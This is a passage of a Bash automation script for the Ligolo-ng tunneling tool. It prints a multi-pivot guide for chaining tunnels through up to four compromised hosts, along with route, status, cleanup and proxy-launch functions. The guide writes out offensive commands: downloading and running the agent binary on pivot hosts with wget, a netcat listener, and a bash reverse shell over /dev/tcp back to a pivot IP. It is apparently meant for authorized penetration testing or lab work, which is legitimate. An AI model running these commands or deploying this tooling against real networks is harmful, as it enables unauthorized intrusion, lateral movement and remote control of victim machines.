    echo -e "${WHITE}${BOLD}  PIVOT 4 - Through Pivot3${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${WHITE}1. Create listener on Pivot3:${NC}"
    note "In Ligolo, Pivot3 selected"
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp"
    echo ""
    echo -e "  ${WHITE}2. Create ligolo4 interface:${NC}"
    cmd "sudo ip tuntap add user \$(whoami) mode tun ligolo4"
    cmd "sudo ip link set ligolo4 up"
    note "Or: $0 interface 4"
    echo ""
    echo -e "  ${WHITE}3. Transfer agent to Pivot4:${NC}"
    note "On Pivot3:"
    cmd "python3 -m http.server 8888"
    note "On Pivot4:"
    cmd "wget http://PIVOT3_IP:8888/agent -O /tmp/agent && chmod +x /tmp/agent"
    echo ""
    echo -e "  ${WHITE}4. Run agent on Pivot4:${NC}"
    cmd "/tmp/agent -connect PIVOT3_INTERNAL_IP:$LIGOLO_PORT -ignore-cert"
    echo -e "                        ${YELLOW}^^^^^^^^^^^^^^^^^${NC}"
    echo -e "                        ${YELLOW}PIVOT3's internal IP!${NC}"
    echo ""
    echo -e "  ${WHITE}5. In Ligolo:${NC}"
    cmd "session"
    note "Select Pivot4"
    cmd "start --tun ligolo4"
    echo ""
    echo -e "  ${WHITE}6. Add route:${NC}"
    cmd "sudo ip route add <PIVOT4_NETWORK>/24 dev ligolo4"
    echo ""
    
    # QUICK REFERENCE
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  QUICK REFERENCE TABLE${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ┌─────────┬───────────┬────────────────────┬─────────────────────┐"
    echo -e "  │ ${WHITE}PIVOT${NC}   │ ${WHITE}INTERFACE${NC} │ ${WHITE}LIGOLO COMMAND${NC}     │ ${WHITE}AGENT CONNECTS TO${NC}   │"
    echo -e "  ├─────────┼───────────┼────────────────────┼─────────────────────┤"
    echo -e "  │ Pivot1  │ ligolo    │ start              │ ATTACKER:$LIGOLO_PORT      │"
    echo -e "  │ Pivot2  │ ligolo2   │ start --tun ligolo2│ PIVOT1_IP:$LIGOLO_PORT     │"
    echo -e "  │ Pivot3  │ ligolo3   │ start --tun ligolo3│ PIVOT2_IP:$LIGOLO_PORT     │"
    echo -e "  │ Pivot4  │ ligolo4   │ start --tun ligolo4│ PIVOT3_IP:$LIGOLO_PORT     │"
    echo -e "  └─────────┴───────────┴────────────────────┴─────────────────────┘"
    echo ""
    echo -e "  ${WHITE}LISTENER (same command for all pivots):${NC}"
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp"
    echo ""
    
    # REVERSE PORT FORWARD
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  REVERSE PORT FORWARD${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${WHITE}Catch shells from deep internal network:${NC}"
    echo ""
    echo -e "  ${WHITE}1. Attacker:${NC}"
    cmd "nc -lvnp 4444"
    echo ""
    echo -e "  ${WHITE}2. Ligolo (select closest pivot to target):${NC}"
    cmd "listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp"
    echo ""
    echo -e "  ${WHITE}3. Target:${NC}"
    cmd "bash -i >& /dev/tcp/CLOSEST_PIVOT_IP/4444 0>&1"
    echo ""
    
    # COMMON ERRORS
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  COMMON ERRORS${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${RED}\"a tunnel is already using this interface name\"${NC}"
    echo -e "    → Create new interface: ${GREEN}$0 interface 2${NC}"
    echo -e "    → Use: ${GREEN}start --tun ligolo2${NC}"
    echo ""
    echo -e "  ${RED}\"connection refused\"${NC}"
    echo -e "    → Listener port must be $LIGOLO_PORT"
    echo -e "    → ${GREEN}listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp${NC}"
    echo ""
    echo -e "  ${RED}\"session\" not working${NC}"
    echo -e "    → Use ARROW KEYS to select!"
    echo ""
}

#------------------------------------------------------------------------------
# ADD ROUTE
#------------------------------------------------------------------------------
add_route() {
    local network="$1"
    local iface="${2:-ligolo}"
    
    if [[ -z "$network" ]]; then
        read -p "Enter network (e.g., 172.16.0.0/16): " network
    fi
    
    if [[ "$network" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
        sudo ip route add "$network" dev "$iface" 2>/dev/null && \
            success "Route added: $network via $iface" || \
            warn "Route may already exist"
    else
        error "Invalid format. Use CIDR"
    fi
    
    echo ""
    info "Routes through $iface:"
    ip route show dev "$iface" 2>/dev/null | sed 's/^/    /'
}

#------------------------------------------------------------------------------
# STATUS
#------------------------------------------------------------------------------
show_status() {
    echo ""
    echo -e "${WHITE}${BOLD}=== LIGOLO STATUS ===${NC}"
    echo ""
    
    # Proxy
    echo -n "Proxy: "
    if pgrep -f "ligolo.*proxy" &>/dev/null; then
        echo -e "${GREEN}RUNNING${NC} (port: $LIGOLO_PORT)"
    else
        echo -e "${YELLOW}NOT RUNNING${NC}"
    fi
    echo ""
    
    # Interfaces
    list_interfaces
    
    echo ""
    echo "Files:"
    for f in proxy agent agent.exe; do
        if [[ -f "$WORK_DIR/$f" ]]; then
            echo -e "    ${GREEN}✓${NC} $f"
        fi
    done
    echo ""
}

#------------------------------------------------------------------------------
# CLEANUP
#------------------------------------------------------------------------------
cleanup() {
    info "Stopping processes..."
    pkill -9 -f "ligolo.*proxy" 2>/dev/null || true
    
    info "Removing interfaces..."
    for i in 1 2 3 4 5 6 7 8; do
        local iface=$(get_interface_name $i)
        if ip link show "$iface" &>/dev/null; then
            sudo ip link set "$iface" down 2>/dev/null
            sudo ip link delete "$iface" 2>/dev/null
            echo "    Removed $iface"
        fi
    done
    
    success "Cleanup complete"
}

#------------------------------------------------------------------------------
# RUN PROXY
#------------------------------------------------------------------------------
run_proxy() {
    cd "$WORK_DIR" || exit 1
    
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}  LIGOLO PROXY - PORT $LIGOLO_PORT${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    echo -e "  ${YELLOW}TIP:${NC} Use ${GREEN}ARROW KEYS${NC} to select sessions!"
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  MULTI-PIVOT QUICK REFERENCE${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${WHITE}PIVOT 1:${NC}"
    echo -e "    ${GREEN}session${NC} → ${GREEN}ifconfig${NC} → ${GREEN}start${NC}"
    echo -e "    Route: ${GREEN}sudo ip route add <NET>/24 dev ligolo${NC}"
    echo ""
    echo -e "  ${WHITE}PIVOT 2:${NC}"
    echo -e "    Listener: ${GREEN}listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp${NC}"
    echo -e "    Interface: ${GREEN}sudo ip tuntap add user \$(whoami) mode tun ligolo2 && sudo ip link set ligolo2 up${NC}"
    echo -e "    Agent: ${GREEN}/tmp/agent -connect PIVOT1_IP:$LIGOLO_PORT -ignore-cert${NC}"
    echo -e "    Ligolo: ${GREEN}session${NC} → ${GREEN}start --tun ligolo2${NC}"
    echo -e "    Route: ${GREEN}sudo ip route add <NET>/24 dev ligolo2${NC}"
    echo ""
    echo -e "  ${WHITE}PIVOT 3:${NC} Same pattern with ${GREEN}ligolo3${NC}, connect to PIVOT2_IP"
    echo -e "  ${WHITE}PIVOT 4:${NC} Same pattern with ${GREEN}ligolo4${NC}, connect to PIVOT3_IP"
    echo ""
    echo -e "  ${WHITE}Full guide:${NC} ${YELLOW}$0 pivot${NC}"
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    
    exec ./proxy -selfcert -laddr 0.0.0.0:$LIGOLO_PORT
}

#------------------------------------------------------------------------------
# MAIN
#------------------------------------------------------------------------------
main() {
    case "${1:-}" in
        -h|--help|help)
            echo "Usage: $0 [command] [options]"
            echo ""
            echo "Commands:"
            echo "  (no args)              Interactive setup"
            echo "  start IP               Quick start"
            echo "  route NETWORK [IFACE]  Add route"
            echo "  interface [NUM]        Create interface (1=ligolo, 2=ligolo2...)"
            echo "  pivot                  Multi-pivot guide (1-4)"
            echo "  status                 Show status"
            echo "  commands               Show commands"
            echo "  cleanup                Remove all"
            echo ""
            echo "Examples:"
            echo "  $0                          # Interactive"
            echo "  $0 start 10.10.14.5         # Quick start"
            echo "  $0 interface 2              # Create ligolo2"
            echo "  $0 interface 4              # Create ligolo through ligolo4"
            echo "  $0 route 172.16.0.0/16 ligolo2"
            echo "  $0 pivot                    # Full multi-pivot guide"
            exit 0
            ;;
        
        start)
            ATTACKER_IP="${2:-$(get_default_ip)}"
            HTTP_PORT=$(find_free_port 8080)
            check_ligolo_port
            setup_binaries
            setup_interface "ligolo"
            generate_commands
            print_instructions
            info "Starting proxy..."
            run_proxy
            ;;
        
        route)
            add_route "$2" "${3:-ligolo}"
            ;;
        
        interface|iface|tun)
            local num="${2:-1}"
            if [[ "$num" -gt 1 ]]; then
                # Create all interfaces up to num
                for ((i=1; i<=num; i++)); do
                    setup_interface "$(get_interface_name $i)"
                done
            else
                setup_interface "ligolo"
            fi
            list_interfaces
            ;;
        
        pivot)
            show_pivot_guide
            ;;
        
        status)
            show_status
            ;;
        
        commands)
            [[ -f "$WORK_DIR/commands.txt" ]] && cat "$WORK_DIR/commands.txt" || error "Run setup first"
            ;;
        
        cleanup)
            cleanup
            ;;
        
        *)
            echo ""
            echo -e "${CYAN}========================================${NC}"
            echo -e "${WHITE}${BOLD}   LIGOLO-NG AUTOMATION v3.2${NC}"
            echo -e "${WHITE}${BOLD}      MULTI-PIVOT EDITION${NC}"
            echo -e "${CYAN}========================================${NC}"
            echo ""
            
            local default_ip=$(get_default_ip)
            read -p "Enter your IP [$default_ip]: " input_ip
            ATTACKER_IP="${input_ip:-$default_ip}"
            
            if ! [[ "$ATTACKER_IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                error "Invalid IP"
                exit 1
            fi
            
            check_ligolo_port
            HTTP_PORT=$(find_free_port 8080)
            
            echo ""
            info "Configuration:"
            echo -e "    IP:          ${GREEN}$ATTACKER_IP${NC}"
            echo -e "    Ligolo Port: ${GREEN}$LIGOLO_PORT${NC} ${YELLOW}(fixed)${NC}"
            echo -e "    HTTP Port:   ${GREEN}$HTTP_PORT${NC}"
            echo ""
            
            setup_binaries
            setup_interface "ligolo"
            generate_commands
            print_instructions
            
            read -p "Start proxy now? [Y/n]: " choice
            if [[ ! "$choice" =~ ^[Nn]$ ]]; then
                info "Starting proxy..."
                run_proxy
            else
                info "To start: cd $WORK_DIR && ./proxy -selfcert -laddr 0.0.0.0:$LIGOLO_PORT"
            fi
            ;;
    esac
}

main "$@"
